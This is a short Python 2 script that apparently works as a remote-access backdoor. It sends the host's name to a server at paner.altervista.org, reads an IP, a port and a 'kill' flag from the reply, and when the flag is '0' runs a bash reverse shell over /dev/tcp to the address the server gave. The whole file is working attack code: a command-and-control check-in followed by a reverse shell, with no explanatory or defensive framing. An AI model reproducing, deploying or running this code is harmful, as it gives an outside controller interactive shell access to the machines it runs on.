#!/usr/bin/python
import time
import sys
import os
import httplib
from os import path, access, R_OK

import socket
if socket.gethostname().find('.')>=0:
    name=socket.gethostname()
else:
    name=socket.gethostbyaddr(socket.gethostname())[0]



try:
    print name
    httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
    httpServ.connect()
    httpServ.request('GET', "/svc/wup.php?pc="+name)
    response = httpServ.getresponse()
    
    if response.status == httplib.OK:
        print "Output from HTML request"
        sresponse = response.read()
        ifind=sresponse.find('ip=')
        sip = sresponse[ifind+3:sresponse.find('||',ifind)]
        ifind=sresponse.find('port=')
        sport = sresponse[ifind+5:sresponse.find('||',ifind)]
        ifind=sresponse.find('kill=')
        skill = sresponse[ifind+5:sresponse.find('||',ifind)]
        print skill
        httpServ.close()
    if skill == '0':
        os.system("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
        os.system("wait")
except Exception,e:
    print str(e)  
    
